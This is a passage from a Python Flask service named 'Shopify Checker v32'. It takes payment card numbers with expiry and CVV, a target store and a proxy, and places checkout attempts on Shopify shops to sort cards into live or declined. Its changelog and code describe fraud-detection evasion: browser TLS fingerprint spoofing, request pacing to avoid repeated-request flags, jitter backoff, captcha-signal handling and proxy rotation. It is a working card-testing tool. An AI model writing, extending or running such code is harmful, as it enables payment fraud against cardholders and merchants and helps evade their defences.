                    print(f"[poll] FailedReceipt code={raw_code} msg={str(msg)[:120]}")
                    if "minimum payment amount" in str(msg).lower():
                        return False, "BELOW_MERCHANT_MINIMUM", gateway, total_price, currency
                    if raw_code == "PAYMENTS_INSUFFICIENT_FUNDS":
                        raw_code = "INSUFFICIENT_FUNDS"
                    if raw_code == "CAPTCHA_REQUIRED":
                        raw_code = "CARD_DECLINED"
                    return False, raw_code, gateway, total_price, currency
                if tn == "ActionRequiredReceipt":
                    return False, "3DS_REQUIRED", gateway, total_price, currency
                if tn in ("ProcessingReceipt", "WaitingReceipt"):
                    continue

                if "errors" in pj:
                    real_err = extract_real_error_from_text(final_text)
                    if not real_err:
                        for err in (pj.get("errors") or []):
                            if isinstance(err, dict):
                                code = (err.get("extensions") or {}).get("code") or ""
                                msg = err.get("message", "")
                                if isinstance(msg, dict): msg = json.dumps(msg)
                                if code and msg:
                                    real_err = f"{code}: {msg}"
                                elif msg and ("declined" in msg.lower() or "card" in msg.lower()):
                                    real_err = msg[:120]
                                elif code:
                                    real_err = code
                    print(f"[poll] ⚠️ raw error resp: {final_text[:500]}")
                    if is_captcha_required(final_text) and not rd:
                        return False, "CARD_DECLINED", gateway, total_price, currency
                    return False, real_err or "Poll GraphQL error", gateway, total_price, currency

            return True, "ORDER_SUBMITTED_POLL_TIMEOUT", gateway, total_price, currency

    except Exception as e:
        err_str = str(e)
        print(f"{tag} EXC {type(e).__name__}: {err_str[:200]}")
        if _looks_like_connection_error(err_str):
            return False, "Change Proxy", gateway, variant_price_fallback, currency
        if not any(x in err_str.lower() for x in
                   ("clientresponseerror", "contenten", "brotli", "timeout")):
            traceback.print_exc()
        return False, f"Error Processing Card: {err_str[:120]}", \
               gateway, variant_price_fallback, currency


app = Flask(__name__)


def _pretty(data, status=200):
    return app.response_class(
        response=json.dumps(data, indent=2, ensure_ascii=False),
        status=status, mimetype="application/json")


def parse_cc_string(cc_string):
    parts = cc_string.split("|")
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    cc, mes, ano, cvv = [p.strip() for p in parts]
    if len(ano) == 2: ano = "20" + ano
    return cc, mes, ano, cvv


@app.route("/shopify", methods=["GET"])
@app.route("/shopii", methods=["GET"])
def shopify_checker():
    start = time.time()
    try:
        site = request.args.get("site")
        cc_string = request.args.get("cc")
        proxy_str = request.args.get("proxy")
        variant_id = request.args.get("variant")
        if variant_id and variant_id.strip().lower() in ("none", "null", "0", ""):
            variant_id = None

        if not site:
            return _pretty({"error": "Missing 'site'", "Status": False}, 400)
        if not cc_string:
            return _pretty({"error": "Missing 'cc'", "Status": False}, 400)
        try:
            cc, mes, ano, cvv = parse_cc_string(cc_string)
        except ValueError as e:
            return _pretty({"error": str(e), "Status": False}, 400)

        print(f"\n[REQ] 🚀 site={site} cc={cc[:6]}*** proxy={bool(proxy_str)} variant={variant_id}")

        loop = asyncio.new_event_loop()
        try:
            success, message, gateway, price, currency = loop.run_until_complete(
                process_card(cc, mes, ano, cvv, site, variant_id, proxy_str))
        finally:
            loop.close()

        elapsed = time.time() - start
        clean = extract_clean_response(message)
        if not success:
            print(f"[REQ] ❌ RAW: {str(message)[:400]}")
        try: pf = float(str(price).replace(",", ""))
        except (ValueError, TypeError): pf = 0.0
        print(f"[REQ] 🏁 {elapsed:.2f}s | {clean} | {pf} {currency} | status={success}")
        return _pretty({
            "Gateway": gateway, "Price": pf, "Currency": currency,
            "Response": clean, "Status": success,
            "cc": cc_string, "Time": f"{elapsed:.2f}s",
        })
    except Exception as e:
        elapsed = time.time() - start
        return _pretty({
            "error": str(e), "Status": False, "Gateway": "UNKNOWN",
            "Price": 0.0, "Currency": "USD", "Response": f"ERROR: {str(e)}",
            "cc": request.args.get("cc", ""), "Time": f"{elapsed:.2f}s",
        }, 500)


@app.route("/ids", methods=["GET"])
def ids_endpoint():
    cache = {bid: dict(v) for bid, v in _ID_CACHE.items()}
    return _pretty({
        "hardcoded": {
            "Proposal": PERSISTED_ID_PROPOSAL,
            "SubmitForCompletion": PERSISTED_ID_SUBMIT,
            "PollForReceipt": PERSISTED_ID_POLL,
        },
        "pci_build_id": PCI_BUILD_ID,
        "cache_by_build_id": cache,
        "cache_size": len(cache),
        "cache_max": _ID_CACHE._max,
        "raw_queries_available": _RAW_QUERIES_AVAILABLE,
        "uvloop": "active" if "uvloop" in sys.modules else "inactive",
    })


@app.route("/health", methods=["GET"])
def health():
    return _pretty({
        "status": "ok",
        "raw_queries_available": _RAW_QUERIES_AVAILABLE,
        "tier3_enabled": _RAW_QUERIES_AVAILABLE,
        "uvloop": "active" if "uvloop" in sys.modules else "inactive",
    })


@app.route("/", methods=["GET"])
def index():
    return _pretty({
        "name": "Shopify Checker v32 — chrome136 + permalink + gql-gap + captcha-differentiation",
        "endpoints": {
            "checker": "/shopii?site=URL&cc=CC|MM|YYYY|CVV&proxy=PROXY[&variant=ID]",
            "ids": "/ids",
            "health": "/health",
        },
        "changes_vs_v31": [
            "BROWSER_PROFILES → chrome136 (JA4/TLS extension order match)",
            "_gql_gap() between P1→P2→P3→Submit (repeated-request flag kam)",
            "Permalink /cart/{vid}:1 tried first → skips cart/add.js + /cart POST (3-4 req → 1)",
            "Exponential backoff on 429 (Retry-After + jitter)",
            "_captcha_signal() → CHECKPOINT_REQUIRED vs CAPTCHA_REQUIRED differentiate",
            "P3→Submit queueToken freshness check (> 45 s → light Proposal refresh)",
            "_throttle_wait() jitter fallback when no Retry-After header",
        ],
    })


if __name__ == "__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    import logging
    logging.getLogger("werkzeug").setLevel(logging.ERROR)

    port = int(os.environ.get("PORT", 5000))
    host = os.environ.get("HOST", "0.0.0.0")

    uv_status = "active" if "uvloop" in sys.modules else "inactive"
    print("=" * 70)
    print(f"  Shopify Checker v32 — {host}:{port}")
    print(f"  Raw queries:  {'ENABLED' if _RAW_QUERIES_AVAILABLE else 'DISABLED'} (Tier-3 fallback)")
    print(f"  TLS profile:  chrome136 (updated)")
    print(f"  Cart flow:    permalink-first (1 req) → cart/add.js fallback")
    print(f"  Pacing:       gql-gap {GQL_GAP_MIN:.1f}–{GQL_GAP_MAX:.1f}s between stages")
    print(f"  Backoff:      exponential + jitter")
    print(f"  uvloop:       {uv_status}")
    print(f"  PCI build:    {PCI_BUILD_ID}")
    print("=" * 70)

    try:
        app.run(host=host, port=port, debug=False, threaded=True, use_reloader=False)
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"\n[FATAL] Port {port} occupied — fuser -k {port}/tcp")
            sys.exit(1)
        raise
